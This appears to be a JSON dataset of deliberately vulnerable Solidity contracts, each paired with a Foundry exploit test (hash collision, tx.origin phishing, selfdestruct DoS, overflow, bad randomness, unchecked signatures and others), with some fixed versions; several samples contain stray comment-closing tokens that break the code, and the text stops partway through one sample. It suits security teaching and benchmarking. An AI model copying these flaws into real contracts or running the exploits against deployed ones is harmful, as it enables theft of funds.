[
  {
    "id": "sample_2_0000",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    HashCollisionBug HashCollisionBugContract;\n\n    function setUp() public {\n        HashCollisionBugContract = new HashCollisionBug();\n    }\n\n    function testHash_collisions() public {\n        emit log_named_bytes32(\n            \"(AAA,BBB) Hash\",\n            HashCollisionBugContract.createHash(\"AAA\", \"BBB\")\n        );\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AAA\", \"BBB\");\n\n        emit log_named_bytes32(\n            \"(AA,ABBB) Hash\",\n            HashCollisionBugContract.createHash(\"AA\", \"ABBB\")\n        );\n        vm.expectRevert(\"Hash collision detected\");\n        HashCollisionBugContract.deposit{value: 1 ether}(\"AA\", \"ABBB\"); //Hash collision detected\n    }\n\n    receive() external payable {}\n}\n\ncontract HashCollisionBug {\n    mapping(bytes32 => uint256) public balances;\n\n    function createHash(\n        string memory _string1,\n        string memory _string2\n    ) public pure returns (bytes32) {\n        return keccak256(abi.encodePacked(_string1, _string2));\n    }\n\n    function deposit(\n        string memory _string1,\n        string memory _string2\n    ) external payable {\n        require(msg.value > 0, \"Deposit amount must be greater than zero\");\n\n        bytes32 hash = createHash(_string1, _string2);\n        // createHash(AAA, BBB) -> AAABBB\n        // createHash(AA, ABBB) -> AAABBB\n        // Check if the hash already exists in the balances mapping\n        require(balances[hash] == 0, \"Hash collision detected\");\n\n        balances[hash] = msg.value;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0001",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    RewardToken RewardTokenContract;\n    VulnStakingRewards VulnStakingRewardsContract;\n    FixedtakingRewards FixedtakingRewardsContract;\n    address alice = vm.addr(1);\n\n    function setUp() public {\n        RewardTokenContract = new RewardToken();\n        VulnStakingRewardsContract = new VulnStakingRewards(\n            address(RewardTokenContract)\n        );\n        RewardTokenContract.transfer(address(alice), 10000 ether);\n        FixedtakingRewardsContract = new FixedtakingRewards(\n            address(RewardTokenContract)\n        );\n        //RewardTokenContract.transfer(address(alice),10000 ether);\n    }\n\n    function testVulnStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(VulnStakingRewardsContract),\n            10000 ether\n        );\n        //admin can rug reward token over recoverERC20()\n        VulnStakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    function testFixedStakingRewards() public {\n        console.log(\n            \"Before rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n        vm.prank(alice);\n        //If alice transfer reward token to VulnStakingRewardsContract\n        RewardTokenContract.transfer(\n            address(FixedtakingRewardsContract),\n            10000 ether\n        );\n        FixedtakingRewardsContract.recoverERC20(\n            address(RewardTokenContract),\n            1000 ether\n        );\n        console.log(\n            \"After rug RewardToken balance in VulnStakingRewardsContract\",\n            RewardTokenContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract VulnStakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) public onlyOwner {\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract FixedtakingRewards {\n    using SafeERC20 for IERC20;\n\n    IERC20 public rewardsToken;\n    address public owner;\n\n    event Recovered(address token, uint256 amount);\n\n    constructor(address _rewardsToken) {\n        rewardsToken = IERC20(_rewardsToken);\n        owner = msg.sender;\n    }\n\n    modifier onlyOwner() {\n        require(msg.sender == owner, \"Only owner can call this function\");\n        _;\n    }\n\n    function recoverERC20(\n        address tokenAddress,\n        uint256 tokenAmount\n    ) external onlyOwner {\n        require(\n            tokenAddress != address(rewardsToken),\n            \"Cannot withdraw the rewardsToken\"\n        );\n        IERC20(tokenAddress).safeTransfer(owner, tokenAmount);\n        emit Recovered(tokenAddress, tokenAmount);\n    }\n}\n\ncontract RewardToken is ERC20, Ownable {\n    constructor() ERC20(\"Rewardoken\", \"Reward\") {\n        _mint(msg.sender, 10000 * 10 ** decimals());\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0002",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Counters.sol\";\n\n// Immunefi #spotthebugchallenge!\n// https://twitter.com/immunefi/status/1557301712549023745\n\ncontract ContractTest is Test {\n    HerToken HerTokenContract;\n\n    function testSafeMint() public {\n        HerTokenContract = new HerToken();\n\n        HerTokenContract.safeMint{value: 1 ether}(address(this), 10);\n        console.log(\n            \"Due to incorrect check msg.value, we can mint many NFTs with 1 Eth.\"\n        );\n        console.log(\"NFT minted:\", HerTokenContract.balanceOf(address(this)));\n    }\n\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public returns (bytes4) {\n        //   HerTokenContract.safeMint{value: 1 ether}(address(this),30);\n        return this.onERC721Received.selector;\n    }\n\n    receive() external payable {}\n}\n\ncontract HerToken is ERC721, Ownable, Test {\n    uint128 constant MINT_PRICE = 1 ether;\n    uint128 constant MAX_SUPPLY = 10000;\n    uint mintIndex;\n    using Counters for Counters.Counter;\n    Counters.Counter private _tokenIdCounter;\n\n    constructor() payable ERC721(\"HarToken\", \"HRT\") {}\n\n    function safeMint(address to, uint256 amount) public payable {\n        require(\n            _tokenIdCounter.current() + amount < MAX_SUPPLY,\n            \"Cannot mint given amount.\"\n        );\n        require(amount > 0, \"Must give a mint amount.\");\n        //fix require(msg.value >= MINT_PRICE * amount, \"Insufficient Ether.\");\n        // before the loop\n        for (uint256 i = 0; i < amount; i++) {\n            require(msg.value >= MINT_PRICE, \"Insufficient Ether.\");\n\n            mintIndex = _tokenIdCounter.current();\n            console.log(\"mintIndex\", mintIndex);\n            _safeMint(to, mintIndex); // no reentrancy issue, because we can not control tokenid.\n            _tokenIdCounter.increment();\n        }\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0003",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract EtherGame {\n    uint public constant targetAmount = 7 ether;\n    address public winner;\n\n    function deposit() public payable {\n        require(msg.value == 1 ether, \"You can only send 1 Ether\");\n\n        uint balance = address(this).balance; // vulnerable\n        require(balance <= targetAmount, \"Game is over\");\n\n        if (balance == targetAmount) {\n            winner = msg.sender;\n        }\n    }\n\n    function claimReward() public {\n        require(msg.sender == winner, \"Not winner\");\n\n        (bool sent, ) = msg.sender.call{value: address(this).balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    EtherGame EtherGameContract;\n    Attack AttackerContract;\n    address alice;\n    address eve;\n\n    function setUp() public {\n        EtherGameContract = new EtherGame();\n        alice = vm.addr(1);\n        eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(eve), 1 ether);\n    }\n\n    function testSelfdestruct() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Eve balance\", eve.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\"Eve deposit 1 Ether...\");\n        vm.prank(eve);\n        EtherGameContract.deposit{value: 1 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n\n        console.log(\"Attack...\");\n        AttackerContract = new Attack(EtherGameContract);\n        AttackerContract.dos{value: 5 ether}();\n\n        console.log(\n            \"Balance of EtherGameContract\",\n            address(EtherGameContract).balance\n        );\n        console.log(\"Exploit completed, Game is over\");\n        EtherGameContract.deposit{value: 1 ether}(); // This call will fail due to contract destroyed.\n    }\n}\n\ncontract Attack {\n    EtherGame etherGame;\n\n    constructor(EtherGame _etherGame) {\n        etherGame = EtherGame(_etherGame);\n    }\n\n    function dos() public payable {\n        // You can simply break the game by sending ether so that\n        // the game balance >= 7 ether\n\n        // cast address to payable\n        address payable addr = payable(address(etherGame));\n        selfdestruct(addr);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0004",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    SimpleBank VSimpleBankContract;\n    FixedSimpleBank FixedSimpleBankContract;\n\n    function setUp() public {\n        VSimpleBankContract = new SimpleBank();\n        FixedSimpleBankContract = new FixedSimpleBank();\n    }\n\n    function testSelfTransfer() public {\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.transfer(address(this), address(this), 10000);\n        VSimpleBankContract.balanceOf(address(this));\n        */\n    }\n\n    function testFixedSelfTransfer() public {\n        vm.expectRevert(\"Cannot transfer funds to the same address.\");\n        FixedSimpleBankContract.transfer(address(this), address(this), 10000);\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        // not check self-transfer\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n        }\n    }\n}\n\ncontract FixedSimpleBank {\n    mapping(address => uint256) private _balances;\n\n    function balanceOf(address _account) public view virtual returns (uint256) {\n        return _balances[_account];\n    }\n\n    function transfer(address _from, address _to, uint256 _amount) public {\n        //Mitigation\n        require(_from != _to, \"Cannot transfer funds to the same address.\");\n\n        uint256 _fromBalance = _balances[_from];\n        uint256 _toBalance = _balances[_to];\n\n        unchecked {\n            _balances[_from] = _fromBalance - _amount;\n            _balances[_to] = _toBalance + _amount;\n            */\n        }\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0005",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Array ArrayContract;\n\n    function testDataLocation() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.deal(address(bob), 1 ether);\n        //vm.startPrank(alice);\n        ArrayContract = new Array();\n        ArrayContract.updaterewardDebt(100); // update rewardDebt to 100\n        (uint amount, uint rewardDebt) = ArrayContract.userInfo(address(this));\n        console.log(\"Non-updated rewardDebt\", rewardDebt);\n\n        console.log(\"Update rewardDebt with storage\");\n        ArrayContract.fixedupdaterewardDebt(100);\n        (uint newamount, uint newrewardDebt) = ArrayContract.userInfo(\n            address(this)\n        );\n        console.log(\"Updated rewardDebt\", newrewardDebt);\n    }\n\n    receive() external payable {}\n}\n\ncontract Array is Test {\n    mapping(address => UserInfo) public userInfo; // storage\n\n    struct UserInfo {\n        uint256 amount; // How many tokens got staked by user.\n        uint256 rewardDebt; // Reward debt. See Explanation below.\n    }\n\n    function updaterewardDebt(uint amount) public {\n        UserInfo memory user = userInfo[msg.sender]; // memory, vulnerable point\n        user.rewardDebt = amount;\n    }\n\n    function fixedupdaterewardDebt(uint amount) public {\n        UserInfo storage user = userInfo[msg.sender]; // storage\n        user.rewardDebt = amount;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0006",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity 0.8.0;\n// the issue is fixed in 0.8.15\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Dirtybytes Dirtybytesontract;\n\n    function testDirtybytes() public {\n        Dirtybytesontract = new Dirtybytes();\n        emit log_named_bytes(\n            \"Array element in h() not being zero::\",\n            Dirtybytesontract.h()\n        );\n        console.log(\n            \"Such that the byte after the 63 bytes allocated below will be 0x02.\"\n        );\n    }\n}\n\ncontract Dirtybytes {\n    event ev(uint[], uint);\n    bytes s;\n\n    constructor() {\n        // The following event emission involves writing to temporary memory at the current location\n        // of the free memory pointer. Several other operations (e.g. certain keccak256 calls) will\n        // use temporary memory in a similar manner.\n        // In this particular case, the length of the passed array will be written to temporary memory\n        // exactly such that the byte after the 63 bytes allocated below will be 0x02. This dirty byte\n        // will then be written to storage during the assignment and become visible with the push in ``h``.\n        emit ev(new uint[](2), 0);\n        bytes memory m = new bytes(63);\n        s = m;\n    }\n\n    function h() external returns (bytes memory) {\n        s.push();\n        return s;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0007",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    GuessTheRandomNumber GuessTheRandomNumberContract;\n    Attack AttackerContract;\n\n    function testRandomness() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 1 ether);\n        vm.prank(alice);\n\n        GuessTheRandomNumberContract = new GuessTheRandomNumber{\n            value: 1 ether\n        }();\n        vm.startPrank(eve);\n        AttackerContract = new Attack();\n        console.log(\n            \"Before exploiting, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        AttackerContract.attack(GuessTheRandomNumberContract);\n        console.log(\n            \"Eve wins 1 Eth, Balance of AttackerContract:\",\n            address(AttackerContract).balance\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract GuessTheRandomNumber {\n    constructor() payable {}\n\n    function guess(uint _guess) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        if (_guess == answer) {\n            (bool sent, ) = msg.sender.call{value: 1 ether}(\"\");\n            require(sent, \"Failed to send Ether\");\n        }\n    }\n}\n\ncontract Attack {\n    receive() external payable {}\n\n    function attack(GuessTheRandomNumber guessTheRandomNumber) public {\n        uint answer = uint(\n            keccak256(\n                abi.encodePacked(blockhash(block.number - 1), block.timestamp)\n            )\n        );\n\n        guessTheRandomNumber.guess(answer);\n    }\n\n    // Helper function to check balance\n    function getBalance() public view returns (uint) {\n        return address(this).balance;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0008",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    KingOfEther KingOfEtherContract;\n    Attack AttackerContract;\n\n    function setUp() public {\n        KingOfEtherContract = new KingOfEther();\n        AttackerContract = new Attack(KingOfEtherContract);\n    }\n\n    function testDOS() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n        vm.deal(address(alice), 4 ether);\n        vm.deal(address(bob), 2 ether);\n        vm.prank(alice);\n        KingOfEtherContract.claimThrone{value: 1 ether}();\n        vm.prank(bob);\n        KingOfEtherContract.claimThrone{value: 2 ether}();\n        console.log(\n            \"Return 1 ETH to Alice, Alice of balance\",\n            address(alice).balance\n        );\n        AttackerContract.attack{value: 3 ether}();\n\n        console.log(\n            \"Balance of KingOfEtherContract\",\n            KingOfEtherContract.balance()\n        );\n        console.log(\"Attack completed, Alice claimthrone again, she will fail\");\n        vm.prank(alice);\n        vm.expectRevert(\"Failed to send Ether\");\n        KingOfEtherContract.claimThrone{value: 4 ether}();\n    }\n\n    receive() external payable {}\n}\n\ncontract KingOfEther {\n    address public king;\n    uint public balance;\n\n    function claimThrone() external payable {\n        require(msg.value > balance, \"Need to pay more to become the king\");\n\n        (bool sent, ) = king.call{value: balance}(\"\");\n        require(sent, \"Failed to send Ether\");\n\n        balance = msg.value;\n        king = msg.sender;\n    }\n}\n\ncontract Attack {\n    KingOfEther kingOfEther;\n\n    constructor(KingOfEther _kingOfEther) {\n        kingOfEther = KingOfEther(_kingOfEther);\n    }\n\n    function attack() public payable {\n        kingOfEther.claimThrone{value: msg.value}();\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0009",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Vault VaultContract;\n\n    function testReadprivatedata() public {\n        VaultContract = new Vault(123456789);\n        bytes32 leet = vm.load(address(VaultContract), bytes32(uint256(0)));\n        console.log(uint256(leet));\n\n        // users in slot 1 - length of array\n        // starting from slot hash(1) - array elements\n        // slot where array element is stored = keccak256(slot)) + (index * elementSize)\n        // where slot = 1 and elementSize = 2 (1 (uint) +  1 (bytes32))\n        bytes32 user = vm.load(\n            address(VaultContract),\n            VaultContract.getArrayLocation(1, 1, 1)\n        );\n        console.log(uint256(user));\n    }\n}\n\ncontract Vault {\n    // slot 0\n    uint256 private password;\n\n    constructor(uint256 _password) {\n        password = _password;\n        User memory user = User({id: 0, password: bytes32(_password)});\n        users.push(user);\n        idToUser[0] = user;\n    }\n\n    struct User {\n        uint id;\n        bytes32 password;\n    }\n\n    // slot 1\n    User[] public users;\n    // slot 2\n    mapping(uint => User) public idToUser;\n\n    function getArrayLocation(\n        uint slot,\n        uint index,\n        uint elementSize\n    ) public pure returns (bytes32) {\n        uint256 a = uint(keccak256(abi.encodePacked(slot))) +\n            (index * elementSize);\n        return bytes32(a);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0010",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract TimeLock {\n    mapping(address => uint) public balances;\n    mapping(address => uint) public lockTime;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n        lockTime[msg.sender] = block.timestamp + 1 weeks;\n    }\n\n    function increaseLockTime(uint _secondsToIncrease) public {\n        lockTime[msg.sender] += _secondsToIncrease; // vulnerable\n    }\n\n    function withdraw() public {\n        require(balances[msg.sender] > 0, \"Insufficient funds\");\n        require(\n            block.timestamp > lockTime[msg.sender],\n            \"Lock time not expired\"\n        );\n\n        uint amount = balances[msg.sender];\n        balances[msg.sender] = 0;\n\n        (bool sent, ) = msg.sender.call{value: amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract ContractTest is Test {\n    TimeLock TimeLockContract;\n    address alice;\n    address bob;\n\n    function setUp() public {\n        TimeLockContract = new TimeLock();\n        alice = vm.addr(1);\n        bob = vm.addr(2);\n        vm.deal(alice, 1 ether);\n        vm.deal(bob, 1 ether);\n    }\n\n    function testOverflow() public {\n        console.log(\"Alice balance\", alice.balance);\n        console.log(\"Bob balance\", bob.balance);\n\n        console.log(\"Alice deposit 1 Ether...\");\n        vm.prank(alice);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Alice balance\", alice.balance);\n\n        console.log(\"Bob deposit 1 Ether...\");\n        vm.startPrank(bob);\n        TimeLockContract.deposit{value: 1 ether}();\n        console.log(\"Bob balance\", bob.balance);\n\n        TimeLockContract.increaseLockTime(\n            type(uint).max + 1 - TimeLockContract.lockTime(bob)\n        );\n\n        console.log(\n            \"Bob will successfully withdraw, because the lock time is overflowed\"\n        );\n        TimeLockContract.withdraw();\n        console.log(\"Bob balance\", bob.balance);\n        vm.stopPrank();\n\n        vm.prank(alice);\n        console.log(\n            \"Alice will fail to withdraw, because the lock time did not expire\"\n        );\n        TimeLockContract.withdraw(); // expect revert\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0011",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n*/\ncontract ContractTest is Test {\n    SimpleBank SimpleBankContract;\n\n    function setUp() public {\n        SimpleBankContract = new SimpleBank();\n    }\n\n    function testVulnSignatureValidation() public {\n        payable(address(SimpleBankContract)).transfer(10 ether);\n        address alice = vm.addr(1);\n        vm.startPrank(alice);\n\n        SimpleBank.Signature[] memory sigs = new SimpleBank.Signature[](0); // empty input\n        //sigs[0] = SimpleBank.Signature(\"\", 0, \"\", \"\");\n\n        console.log(\n            \"Before exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n        SimpleBankContract.withdraw(sigs); // Call the withdraw function of the SimpleBank contract with empty sigs array as the parameter\n\n        console.log(\n            \"Afer exploiting, Alice's ether balance\",\n            address(alice).balance\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract SimpleBank {\n    struct Signature {\n        bytes32 hash;\n        uint8 v;\n        bytes32 r;\n        bytes32 s;\n    }\n\n    function verifySignatures(Signature calldata sig) public {\n        require(\n            msg.sender == ecrecover(sig.hash, sig.v, sig.r, sig.s),\n            \"Invalid signature\"\n        );\n    }\n\n    function withdraw(Signature[] calldata sigs) public {\n        // Mitigation: Check the number of signatures\n        //require(sigs.length > 0, \"No signatures provided\");\n        for (uint i = 0; i < sigs.length; i++) {\n            Signature calldata signature = sigs[i];\n            // Verify every signature and revert if any of them fails to verify.\n            verifySignatures(signature);\n        }\n        payable(msg.sender).transfer(1 ether);\n    }\n\n    receive() external payable {}\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0012",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.15;\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    Wallet WalletContract;\n    Attack AttackerContract;\n\n    function testtxorigin() public {\n        address alice = vm.addr(1);\n        address eve = vm.addr(2);\n        vm.deal(address(alice), 10 ether);\n        vm.deal(address(eve), 1 ether);\n        vm.prank(alice);\n        WalletContract = new Wallet{value: 10 ether}(); //Alice deploys Wallet with 10 Ether\n        console.log(\"Owner of wallet contract\", WalletContract.owner());\n        vm.prank(eve);\n        AttackerContract = new Attack(WalletContract); //Eve deploys Attack with the address of Alice's Wallet contract.\n        console.log(\"Owner of attack contract\", AttackerContract.owner());\n        console.log(\"Eve of balance\", address(eve).balance);\n\n        vm.prank(alice, alice);\n        AttackerContract.attack();\n        console.log(\"tx origin address\", tx.origin);\n        console.log(\"msg.sender address\", msg.sender);\n        console.log(\"Eve of balance\", address(eve).balance);\n    }\n\n    receive() external payable {}\n}\n\ncontract Wallet {\n    address public owner;\n\n    constructor() payable {\n        owner = msg.sender;\n    }\n\n    function transfer(address payable _to, uint _amount) public {\n        // check with msg.sender instead of tx.origin\n        require(tx.origin == owner, \"Not owner\");\n\n        (bool sent, ) = _to.call{value: _amount}(\"\");\n        require(sent, \"Failed to send Ether\");\n    }\n}\n\ncontract Attack {\n    address payable public owner;\n    Wallet wallet;\n\n    constructor(Wallet _wallet) {\n        wallet = Wallet(_wallet);\n        owner = payable(msg.sender);\n    }\n\n    function attack() public {\n        wallet.transfer(owner, address(wallet).balance);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0013",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.7.6;\n// this need to be older version of solidity from 0.8.0 solidty compiler checks for overflow and underflow\n\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    TokenWhaleChallenge TokenWhaleChallengeContract;\n\n    function testOverflow2() public {\n        address alice = vm.addr(1);\n        address bob = vm.addr(2);\n\n        TokenWhaleChallengeContract = new TokenWhaleChallenge();\n        TokenWhaleChallengeContract.TokenWhaleDeploy(address(this));\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n        TokenWhaleChallengeContract.transfer(address(alice), 800);\n\n        vm.prank(alice);\n        TokenWhaleChallengeContract.approve(address(this), 1000);\n        TokenWhaleChallengeContract.transferFrom(\n            address(alice),\n            address(bob),\n            500\n        );\n\n        console.log(\"Exploit completed, balance overflowed\");\n        console.log(\n            \"Player balance:\",\n            TokenWhaleChallengeContract.balanceOf(address(this))\n        );\n    }\n\n    receive() external payable {}\n}\n\ncontract TokenWhaleChallenge {\n    address player;\n\n    uint256 public totalSupply;\n    mapping(address => uint256) public balanceOf;\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    string public name = \"Simple ERC20 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    function TokenWhaleDeploy(address _player) public {\n        player = _player;\n        totalSupply = 1000;\n        balanceOf[player] = 1000;\n    }\n\n    function isComplete() public view returns (bool) {\n        return balanceOf[player] >= 1000000;\n    }\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function _transfer(address to, uint256 value) internal {\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n\n        emit Transfer(msg.sender, to, value);\n    }\n\n    function transfer(address to, uint256 value) public {\n        require(balanceOf[msg.sender] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n\n        _transfer(to, value);\n    }\n\n    event Approval(\n        address indexed owner,\n        address indexed spender,\n        uint256 value\n    );\n\n    function approve(address spender, uint256 value) public {\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n    }\n\n    function transferFrom(address from, address to, uint256 value) public {\n        require(balanceOf[from] >= value);\n        require(balanceOf[to] + value >= balanceOf[to]);\n        require(allowance[from][msg.sender] >= value);\n\n        allowance[from][msg.sender] -= value;\n        _transfer(to, value);\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0014",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\nimport \"forge-std/Test.sol\";\n\n*/\n\ncontract ContractTest is Test {\n    ownerGame ownerGameContract;\n\n    function testVisibility() public {\n        ownerGameContract = new ownerGame();\n        console.log(\n            \"Before exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        ownerGameContract.changeOwner(msg.sender);\n        console.log(\n            \"After exploiting, owner of ownerGame:\",\n            ownerGameContract.owner()\n        );\n        console.log(\"Exploit completed\");\n    }\n\n    receive() external payable {}\n}\n\ncontract ownerGame {\n    address public owner;\n\n    constructor() {\n        owner = msg.sender;\n    }\n\n    // wrong visibility of changeOwner function should be onlyOwner\n    function changeOwner(address _new) public {\n        owner = _new;\n    }\n}\n",
    "pragma": "",
    "difficulty_tier": 2,
    "context_level": "single_file"
  },
  {
    "id": "sample_2_0015",
    "language": "solidity",
    "chain": "evm",
    "file_content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.18;\n\nimport \"forge-std/Test.sol\";\n\n*/\ncontract ContractTest is Test {\n    Miscalculation MiscalculationContract;\n    Calculation CalculationContract;\n\n    function testMiscalculation() public {\n        MiscalculationContract = new Miscalculation();\n        console.log(\"Perform Miscalculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract the discount, get the sale price:\",\n            MiscalculationContract.price(80, 90)\n        );\n        console.log(\n            \"Solidity doesn't do decimals, so dividing before multiplying will round to zero. 0.8*90=0\"\n        );\n        console.log(\n            \"---------------------------------------------------------\"\n        );\n        CalculationContract = new Calculation();\n        console.log(\"Perform Correct calculation Contract\");\n        console.log(\n            \"Scenario: DeFi store 10% off now, Then we buy 1 item price: $80.\"\n        );\n        console.log(\n            \"Subtract  the discount, get the sale price:\",\n            CalculationContract.price(80, 90)\n        